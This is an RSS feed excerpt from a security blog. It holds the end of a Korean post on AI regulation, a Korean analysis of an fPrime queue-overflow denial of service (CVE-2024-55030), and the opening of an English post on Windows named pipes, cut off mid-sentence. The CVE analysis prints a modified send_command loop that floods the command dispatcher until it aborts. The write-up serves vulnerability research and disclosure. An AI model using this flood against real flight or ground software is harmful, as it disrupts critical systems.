&#xC18D;&#xB3C4;&#xC5D0; &#xBE44;&#xD574; &#xC815;&#xCC45;&#xC774; &#xB4A4;&#xB530;&#xB77C;&#xAC00;&#xB294; &#xD604;&#xC2E4;&#xC774; &#xB298; &#xBB38;&#xC81C;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xB2E4;&#xACE0; &#xC900;&#xBE44;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xC123;&#xBD88;&#xB9AC; &#xBC95;&#xACFC; &#xC81C;&#xB3C4;&#xB97C; &#xB3C4;&#xC785;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xC704;&#xD5D8;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC815;&#xCC45;&#xC774; &#xC0DD;&#xAE30;&#xBA74; &#xC790;&#xC5F0;&#xC2A4;&#xB7FD;&#xAC8C; &#xADDC;&#xC81C;&#xAC00; &#xC0DD;&#xAE30;&#xACE0;, &#xC774;&#xB294; &#xACB0;&#xAD6D; &#xAE30;&#xC220; &#xBC1C;&#xC804;&#xC744; &#xC800;&#xD574;&#xD558;&#xB294; &#xACB0;&#xACFC;&#xB97C; &#xB0B3;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; AI&#xCC98;&#xB7FC; &#xBE60;&#xB978; &#xC804;&#xD658;&#xACFC; &#xD601;&#xC2E0;&#xC774; &#xC911;&#xC694;&#xD55C; &#xBD84;&#xC57C;&#xC5D0;&#xC11C;&#xB294;, &#xADDC;&#xC81C;&#xAC00; &#xAE30;&#xC220;&#xC758; &#xC18D;&#xB3C4;&#xB97C; &#xC9C0;&#xB098;&#xCE58;&#xAC8C; &#xC81C;&#xD55C;&#xD558;&#xAC8C; &#xB418;&#xBA74; &#xACB0;&#xAD6D; &#xC6B0;&#xB9AC;&#xB098;&#xB77C;&#xAC00; &#xAE00;&#xB85C;&#xBC8C; &#xACBD;&#xC7C1;&#xC5D0;&#xC11C; &#xB4A4;&#xCC98;&#xC9C8; &#xAC00;&#xB2A5;&#xC131;&#xB3C4; &#xBC30;&#xC81C;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xAE00;&#xC744; &#xC77D;&#xACE0; &#xC788;&#xB294; &#xB3C5;&#xC790; &#xBCF8;&#xC778; &#xC2A4;&#xC2A4;&#xB85C;&#xC5D0;&#xAC8C; &#xC9C8;&#xBB38;&#xD574;&#xBCF4;&#xB294;&#xAC74; &#xC5B4;&#xB5A4;&#xAC00;&#xC694;?<br><strong>&#x201C;&#xAE30;&#xC220;&#xC758; &#xC18D;&#xB3C4;&#xB97C; &#xB530;&#xB77C;&#xC7A1;&#xB294; &#xADDC;&#xC81C;&#xB294; &#xAC00;&#xB2A5;&#xD55C;&#xAC00;?&#x201D;</strong><br><strong>&#x201C;&#xB9CC;&#xC57D; &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xB2E4;&#xBA74;, &#xC6B0;&#xB9AC;&#xB294; &#xAE30;&#xC220;&#xC744; &#xBA3C;&#xC800; &#xD5C8;&#xC6A9;&#xD558;&#xACE0; &#xBB38;&#xC81C;&#xB97C; &#xC0AC;&#xD6C4;&#xC5D0; &#xBCF4;&#xC644;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB098;&#xC544;&#xAC00;&#xC57C; &#xD558;&#xB294;&#xAC00;?&#x201D;</strong><br><strong>&#x201C;&#xAE30;&#xC220; &#xBC1C;&#xC804;&#xACFC; &#xACF5;&#xACF5;&#xC758; &#xC548;&#xC804;, &#xC5B4;&#xB290; &#xCABD;&#xC5D0; &#xB354; &#xBB34;&#xAC8C;&#xB97C; &#xB450;&#xC5B4;&#xC57C; &#xD560;&#xAE4C;?&#x201D;</strong></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.kisa.or.kr/20201/form?postSeq=241&amp;page=1">https://www.kisa.or.kr/20201/form?postSeq=241&amp;page=1</a><br><a href="https://www.skshieldus.com/blog-security/security-trend-idx50">https://www.skshieldus.com/blog-security/security-trend-idx50</a><br><a href="https://v.daum.net/v/20250418162437559">https://v.daum.net/v/20250418162437559</a><br><a href="https://www.lawtimes.co.kr/LawFirm-NewsLetter/204461">https://www.lawtimes.co.kr/LawFirm-NewsLetter/204461</a><br><a href="https://zdnet.co.kr/view/?no=20241226170834">https://zdnet.co.kr/view/?no=20241226170834</a><br><a href="https://www.kita.net/board/totalTradeNews/totalTradeNewsDetail.do?no=85889&amp;siteId=1">https://www.kita.net/board/totalTradeNews/totalTradeNewsDetail.do?no=85889&amp;siteId=1</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/ai/">ai</category>
      
      <category domain="https://hackyboiz.github.io/tags/aiAct/">aiAct</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/16/romi0x/ai_act_ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-55030 : NASA fPrime의 Queue Overflow로 인한 DoS 취약점</title>
      <link>https://hackyboiz.github.io/2025/05/14/OUYA77/2025-05-14/</link>
      <guid>https://hackyboiz.github.io/2025/05/14/OUYA77/2025-05-14/</guid>
      <pubDate>Wed, 14 May 2025 12:20:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://visionspace.com/remote-code-execution-and-critica</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://visionspace.com/remote-code-execution-and-critical-vulnerabilities-in-nasa-fprime-v3-4-3/">https://visionspace.com/remote-code-execution-and-critical-vulnerabilities-in-nasa-fprime-v3-4-3/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>fPrime &#x2264; v3.4.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h3><p>fPrime&#xC740; &#xC6B0;&#xC8FC; &#xBE44;&#xD589; &#xC5B4;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC704;&#xD55C; &#xAC00;&#xBCBC;&#xC6B4; &#xAC1C;&#xBC1C; &#xBC0F; &#xBC30;&#xD3EC; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;. &#xC2DC;&#xC2A4;&#xD15C;&#xC740; &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8;&#xB85C; &#xC5F0;&#xACB0;&#xB41C; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xB4E4;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70;, &#xC774;&#xBCA4;&#xD2B8;&#xC640; &#xBA85;&#xB839;&#xC744; &#xD1B5;&#xD574; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8; &#xAC04; &#xD1B5;&#xC2E0;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xB294; &#xB2E4;&#xB978; &#xC694;&#xC18C;&#xB4E4;&#xACFC; &#xC811;&#xCD09;(&#xB610;&#xB294; &#xD1B5;&#xC2E0;)&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC785;/&#xCD9C;&#xB825; &#xD3EC;&#xD2B8;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xC5EC; &#xC774;&#xBCA4;&#xD2B8;&#xB97C; &#xC54C;&#xB9AC;&#xAC70;&#xB098; &#xBA85;&#xB839;&#xC744; &#xC8FC;&#xACE0;&#xBC1B;&#xC73C;&#xBA70; &#xD1B5;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image.png" alt="image.png"></p><p>Command Dispatcher Service &#xC5ED;&#xC2DC; fprime &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C; &#xB0B4;&#xC758; &#xD55C; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xB85C;&#xC11C;, &#xC678;&#xBD80;&#xB85C;&#xBD80;&#xD130; &#xBA85;&#xB839;&#xC744; &#xBC1B;&#xC544; &#xB0B4;&#xBD80; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xB85C; &#xC911;&#xACC4;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, Command Dispatcher Service&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xC678;&#xBD80;&#xB85C;&#xBD80;&#xD130;&#xC758; &#xBA85;&#xB839;&#xC740; &#xC544;&#xB798; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC774; &#xC9C0;&#xC0C1; &#xC2DC;&#xC2A4;&#xD15C;(Ground System)&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. &#xC9C0;&#xC0C1; &#xC2DC;&#xC2A4;&#xD15C;&#xC740; &#xBE44;&#xD589; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; &#xD0D1;&#xC7AC;&#xB41C; &#xC2DC;&#xC2A4;&#xD15C;(e.g., &#xC704;&#xC131;)&#xACFC; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xD1B5;&#xC2E0;&#xD558;&#xACE0; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xB2F4;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="image%201.png" alt="image.png"></p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>Command Dispatcher Service&#xC5D0;&#xC11C; &#xC678;&#xBD80;&#xB85C;&#xBD80;&#xD130; &#xC720;&#xC785;&#xB418;&#xB294; &#xB2E4;&#xB7C9;&#xC758; &#xBA85;&#xB839;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xB54C;, &#xB0B4;&#xBD80; &#xBA85;&#xB839; &#xD050;(<code>m_queue</code> &#xB610;&#xB294; <code>m_seqCmdBuffQueue</code>)&#xAC00; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB418;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC678;&#xBD80; &#xC18C;&#xC2A4;(e.g., &#xC9C0;&#xC0C1; &#xC2DC;&#xC2A4;&#xD15C;)&#xB85C;&#xBD80;&#xD130; &#xB4E4;&#xC5B4;&#xC624;&#xB294; &#xBA85;&#xB839;&#xC744; &#xC218;&#xC2E0;&#xD558;&#xC5EC; &#xD574;&#xB2F9; &#xBA85;&#xB839;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xBAA9;&#xC801;&#xC9C0; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xB85C; &#xC911;&#xACC4;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; <code>pipeline/standard.py</code>&#xC758; <code>send_command</code> &#xD568;&#xC218;&#xB97C; &#xBB34;&#xD55C; &#xB8E8;&#xD504;[1]&#xB85C; &#xC218;&#xC815;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xC744; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xBE60;&#xB974;&#xAC8C; &#xC804;&#xC1A1;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC7AC;&#xD604;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xCC98;&#xB7FC; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xB9CE;&#xC740; &#xBA85;&#xB839;&#xC774; &#xC9E7;&#xC740; &#xC2DC;&#xAC04; &#xB0B4;&#xC5D0; &#xC720;&#xC785;&#xB418;&#xBA74;, Command Dispatcher Service&#xB294; &#xC774;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xB0B4;&#xBD80; &#xD050;&#xC5D0; &#xBD80;&#xB2F4;&#xC744; &#xBC1B;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_command</span>(<span class="hljs-params">self, command, args</span>):</span>    <span class="hljs-string">&quot;&quot;&quot;Sends commands to the encoder and history.</span><span class="hljs-string"></span><span class="hljs-string">    :param command: command id from dictionary to get command template</span><span class="hljs-string">    :param args: arguments to process</span><span class="hljs-string">    &quot;&quot;&quot;</span>    <span class="hljs-keyword">if</span> isinstance(command, str):        command_template = self.dictionaries.command_name[command]    <span class="hljs-keyword">else</span>:        command_template = self.dictionaries.command_id[command]    cmd_data = fprime_gds.common.data_types.cmd_data.CmdData(        tuple(args), command_template    )    cmd_data.time = fprime.common.models.serialize.time_type.TimeType()    cmd_data.time.set_datetime(datetime.datetime.now(), <span class="hljs-number">2</span>)    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:  // [<span class="hljs-number">1</span>] Infinite Loop          self.coders.send_command(cmd_data)</code></pre><p>&#xB8E8;&#xD2B8; &#xCEE4;&#xC988;&#xB294; &#xC218;&#xC2E0;&#xB41C; &#xBA85;&#xB839;&#xC744; &#xB0B4;&#xBD80; &#xD050;&#xC5D0; &#xB123;&#xB294; &#xB85C;&#xC9C1;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. <code>CommandDispatcherComponentBase::seqCmdBuff_handlerBase()</code> &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; &#xC218;&#xC2E0;&#xB41C; &#xBA85;&#xB839; &#xBA54;&#xC2DC;&#xC9C0;(<code>msg</code>)&#xB97C; &#xD050;&#xC5D0; &#xC804;&#xC1A1;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xCF54;&#xB4DC;&#xAC00; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;:</p><pre><code class="hljs c">Os::Queue::QueueBlocking _block = Os::Queue::QUEUE_NONBLOCKING; <span class="hljs-comment">// [2]</span>Os::Queue::QueueStatus qStatus = <span class="hljs-keyword">this</span>-&gt;m_queue.send(msg, <span class="hljs-number">0</span>, _block); <span class="hljs-comment">// &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD050;&#xC5D0; &#xC804;&#xC1A1; &#xC2DC;&#xB3C4;</span>FW_ASSERT(    qStatus == Os::Queue::QUEUE_OK,     <span class="hljs-keyword">static_cast</span>&lt;FwAssertArgType&gt;(qStatus) );</code></pre><p>&#xC774; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xD050; &#xC804;&#xC1A1; &#xBC29;&#xC2DD;&#xC740; <code>Os::Queue::QUEUE_NONBLOCKING</code>&#xC73C;&#xB85C; &#xC124;&#xC815;[2]&#xB418;&#xC5B4; &#xC788;&#xC5B4;, &#xD050;&#xAC00; &#xAC00;&#xB4DD; &#xCC3C;&#xC744; &#xB54C; &#xBE14;&#xB85D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC989;&#xC2DC; &#xC0C1;&#xD0DC;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>this-&gt;m_queue.send()</code>&#xB294; <code>bareSendNonBlock()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0;[3],</p><pre><code class="hljs c"><span class="hljs-function">Queue::QueueStatus <span class="hljs-title">Queue::send</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Fw::SerializeBufferBase &amp;buffer, NATIVE_INT_TYPE priority, QueueBlocking block)</span> </span>{    <span class="hljs-keyword">const</span> U8* msgBuff = buffer.getBuffAddr();    NATIVE_INT_TYPE buffLength = buffer.getBuffLength();    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;send(msgBuff, buffLength, priority, block);}<span class="hljs-function">Queue::QueueStatus <span class="hljs-title">Queue::send</span><span class="hljs-params">(<span class="hljs-keyword">const</span> U8* buffer, NATIVE_INT_TYPE size, NATIVE_INT_TYPE priority, QueueBlocking block)</span> </span>{    <span class="hljs-comment">//Check if the handle is null or check the underlying queue is null</span>        <span class="hljs-comment">/* ... */</span>            <span class="hljs-comment">//Send to the queue</span>    <span class="hljs-keyword">if</span> (QUEUE_NONBLOCKING == block) { <span class="hljs-comment">//[3]</span>        <span class="hljs-keyword">return</span> bareSendNonBlock(handle, buffer, size, priority);    }    <span class="hljs-keyword">return</span> bareSendBlock(handle, buffer, size, priority);}</code></pre><p>&#xC774;&#xB294; &#xB2E4;&#xC2DC; &#xC2E4;&#xC81C; &#xBC84;&#xD37C; &#xD050; &#xAD6C;&#xD604;&#xC758; <code>push()</code> &#xBA54;&#xC11C;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD050;&#xC5D0; &#xC0BD;&#xC785;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;[4].</p><pre><code class="hljs c"><span class="hljs-function">Queue::QueueStatus <span class="hljs-title">bareSendNonBlock</span><span class="hljs-params">(BareQueueHandle&amp; handle, <span class="hljs-keyword">const</span> U8* buffer, NATIVE_INT_TYPE size, NATIVE_INT_TYPE priority)</span> </span>{    / * ... */        Queue::QueueStatus status = Queue::QUEUE_OK;     <span class="hljs-keyword">bool</span> success = <span class="hljs-built_in">queue</span>.push(buffer, size, priority); <span class="hljs-comment">// [4]</span>    <span class="hljs-keyword">if</span>(!success) { <span class="hljs-comment">// push&#xAC00; &#xC2E4;&#xD328;&#xD588;&#xB2E4;&#xBA74; (e.g., &#xD050;&#xAC00; &#xAC00;&#xB4DD; &#xCC3C;&#xB2E4;&#xBA74;)</span>        status = Queue::QUEUE_FULL; <span class="hljs-comment">// &#xC0C1;&#xD0DC;&#xB97C; QUEUE_FULL&#xB85C; &#xC124;&#xC815;</span>    }    <span class="hljs-keyword">return</span> status; <span class="hljs-comment">// &#xCD5C;&#xC885; &#xC0C1;&#xD0DC; &#xBC18;&#xD658;</span>}</code></pre><p>&#xB9CC;&#xC57D; &#xD050;&#xAC00; &#xAC00;&#xB4DD; &#xCC3C;&#xB2E4;&#xBA74;, <code>push()</code>&#xB294; <code>false</code>&#xB97C; &#xBC18;&#xD658;&#xD558;&#xACE0;, &#xC774;&#xB294; <code>bareSendNonBlock()</code> &#xD568;&#xC218;&#xB97C; &#xAC70;&#xCCD0; <code>Os::Queue::QUEUE_FULL</code> (&#xC624;&#xB958; &#xCF54;&#xB4DC; 8) &#xC0C1;&#xD0DC;&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xC5B4; <code>m_queue.send()</code>&#xC758; &#xBC18;&#xD658; &#xAC12;&#xC778; <code>qStatus</code>&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;[5].</p><p>&#xBB38;&#xC81C;&#xB294; &#xBC14;&#xB85C; &#xADF8;&#xB2E4;&#xC74C; &#xC904;&#xC758; <code>FW_ASSERT</code> &#xAD6C;&#xBB38;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC5B4;&#xC124;&#xC158;&#xC740; <code>qStatus</code>&#xAC00; <code>Os::Queue::QUEUE_OK</code>&#xC640; &#xAC19;&#xC744; &#xAC83;&#xC774;&#xB77C;&#xACE0; <strong>&#xB2E8;&#xC815;</strong>&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xD050; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB85C; &#xC778;&#xD574; <code>qStatus</code>&#xAC00; <code>Os::Queue::QUEUE_FULL</code> (8)&#xC774; &#xB418;&#xBA74;, &#xC774; &#xC5B4;&#xC124;&#xC158; &#xC870;&#xAC74;&#xC774; &#xAC70;&#xC9D3;&#xC774; &#xB418;&#xC5B4; &#xC5B4;&#xC124;&#xC158; &#xC2E4;&#xD328;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">Os::Queue::QueueBlocking _block = Os::Queue::QUEUE_NONBLOCKING; Os::Queue::QueueStatus qStatus = <span class="hljs-keyword">this</span>-&gt;m_queue.send(msg, <span class="hljs-number">0</span>, _block); FW_ASSERT( <span class="hljs-comment">// &#xC804;&#xC1A1; &#xC0C1;&#xD0DC;&#xC5D0; &#xB300;&#xD55C; &#xC5B4;&#xC124;&#xC158; &#xCCB4;&#xD06C;</span>    qStatus == Os::Queue::QUEUE_OK, <span class="hljs-comment">// [5] &#xC0C1;&#xD0DC;&#xAC00; QUEUE_OK (&#xC131;&#xACF5;)&#xC778;&#xC9C0; &#xD655;&#xC778;</span>    <span class="hljs-keyword">static_cast</span>&lt;FwAssertArgType&gt;(qStatus) <span class="hljs-comment">// &#xC2E4;&#xD328; &#xC2DC; &#xC0C1;&#xD0DC; &#xAC12; &#xCD9C;&#xB825;</span>);</code></pre><p>&#xC5B4;&#xC124;&#xC158; &#xC790;&#xCCB4;&#xB294; &#xB514;&#xBC84;&#xAE45; &#xB3C4;&#xAD6C;&#xC774;&#xC9C0;&#xB9CC;, &#xAE30;&#xBCF8; &#xC2DC;&#xC2A4;&#xD15C; &#xC124;&#xC815;&#xC5D0;&#xC11C; &#xC5B4;&#xC124;&#xC158; &#xC2E4;&#xD328; &#xC2DC; <code>sigabort</code> &#xC2E0;&#xD638;&#xB97C; &#xBCF4;&#xB0B4;&#xBA70; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xAC15;&#xC81C; &#xC885;&#xB8CC;&#xD558;&#xB3C4;&#xB85D; &#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xACFC;&#xB3C4;&#xD55C; &#xBA85;&#xB839; &#xC804;&#xC1A1;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xD050; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xC5B4;&#xC124;&#xC158; &#xC2E4;&#xD328;&#xB97C; &#xC720;&#xBC1C;&#xD558;&#xACE0;, &#xAD81;&#xADF9;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xD589; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xBE44;&#xC815;&#xC0C1; &#xC885;&#xB8CC;&#xB418;&#xB294; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80;(DoS) &#xC0C1;&#xD0DC;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image%202.png" alt="image.png"></p><p>&#xC815;&#xB9AC;&#xD558;&#xBA74;, &#xD050;&#xAC00; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xB418;&#xC5C8;&#xC744; &#xB54C;&#xC758; &#xD578;&#xB4E4;&#xB9C1;&#xC744; &#xC5B4;&#xC124;&#xC158;&#xC774; &#xC544;&#xB2CC;  &#xCC28;&#xB2E8;&#xD558;&#xAC70;&#xB098; &#xB4DC;&#xB86D;&#xD558;&#xAC70;&#xB098; &#xD6C5;&#xD558;&#xB294; &#xB4F1;&#xC73C;&#xB85C; &#xC801;&#xC808;&#xD788; &#xC124;&#xC815;&#xD574;&#xC918;&#xC57C;&#xD558;&#xB294;&#xB370; &#xAE30;&#xBCF8; &#xC124;&#xC815;&#xC73C;&#xB85C; &#xC5B4;&#xC124;&#xC158;&#xC744; &#xC801;&#xC6A9;&#xD558;&#xC5EC; &#xD050;&#xAC00; &#xAF49;&#xCC28;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xAEBC;&#xC9C0;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%203.png" alt="image.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.cve.org/CVERecord?id=CVE-2024-55030">https://www.cve.org/CVERecord?id=CVE-2024-55030</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/DoS/">DoS</category>
      
      <category domain="https://hackyboiz.github.io/tags/NASA/">NASA</category>
      
      <category domain="https://hackyboiz.github.io/tags/fPrime/">fPrime</category>
      
      <category domain="https://hackyboiz.github.io/tags/Queue-Overflow/">Queue Overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/Assertion/">Assertion</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-55030/">CVE-2024-55030</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/14/OUYA77/2025-05-14/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows Named Pipe (EN)</title>
      <link>https://hackyboiz.github.io/2025/05/12/ogu123/NamedPipe/EN/</link>
      <guid>https://hackyboiz.github.io/2025/05/12/ogu123/NamedPipe/EN/</guid>
      <pubDate>Mon, 12 May 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;Hi, this is ogu123!!!&lt;/p&gt;
&lt;p&gt;T</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Hi, this is ogu123!!!</p><p>Today we&#x2019;re going to talk about Windows Named Pipes!</p><p>Until now, IPC is a way to communicate between processes~ &#x2190; I&#x2019;ve known about it in a vague way&#x2026;</p><p>This time, we&#x2019;re going to learn more about Named Pipe, one of the many IPCs!</p><p><del>(What Tungx9 Sahur is holding is a Pipe.)</del></p><p><img src="/2025/05/12/ogu123/NamedPipe/EN/1.png" alt></p><h2 id="Windows-IPC"><a href="#Windows-IPC" class="headerlink" title="Windows IPC"></a>Windows IPC</h2><p>First, let&#x2019;s talk about Inter Process Communication (IPC), which is a method that allows processes to communicate with each other!</p><p>Below are the different IPC methods used by Windows.</p><ul><li>Shared Memory</li><li>Mail Slot</li><li>Component Object Model (COM)</li><li>Pipe</li></ul><p>Here I was wondering, why do we need to communicate between processes and what are the advantages?</p><p><img src="/2025/05/12/ogu123/NamedPipe/EN/2.png" alt></p><p>First, processes are created individually, as shown in the image above, so they don&#x2019;t have access to each other! This is called an <strong>Independent Process</strong>.</p><p>However, in complex situations, processes need to exchange state values or data with each other! Let&#x2019;s explain this with a simple example.</p><p><img src="/2025/05/12/ogu123/NamedPipe/EN/3.png" alt></p><p>Let&#x2019;s say you&#x2019;re downloading a file in a web browser! The browser has two processes running: one that displays the download progress on the screen, as shown in the figure, and one that downloads the actual file data.</p><p>The download process needs to send progress information to the screen process, such as &#x201C;<strong>Now 70% downloaded!</strong>&#x201D; so that the user can see the progress bar, and the screen process needs to tell the download process &#x201C;<strong>You pressed the stop button!</strong>&#x201D; so that the download stops.</p><p>When processes communicate with each other by sending and receiving state values or data, as in the example above, they are called co-operating processes, and the advantages of doing so are that they can share resources to work more efficiently, and parallel processing makes programs run faster and more efficiently.</p><p>However, it increases system complexity and requires thorough design as it can introduce vulnerabilities and synchronization issues when reading/writing data.</p><h2 id="Windows-IPC-Pipe"><a href="#Windows-IPC-Pipe" class="headerlink" title="Windows IPC Pipe"></a>Windows IPC Pipe</h2><p>Now that we&#x2019;ve covered what IPC is and why we use it, let&#x2019;s take a look at the different Windows IPC techniques and learn about Pipe.</p><p>First of all, there are two types of pipes: Anonymous Pipes and Named Pipes. The literal translation is an unnamed pipe and a named pipe&#x2026; which makes no sense at all, but let&#x2019;s see what we mean by names first!</p><p><img src="/2025/05/12/ogu123/NamedPipe/EN/4.png" alt></p><p>For Anonymous and named pipes, think of <strong>name as the 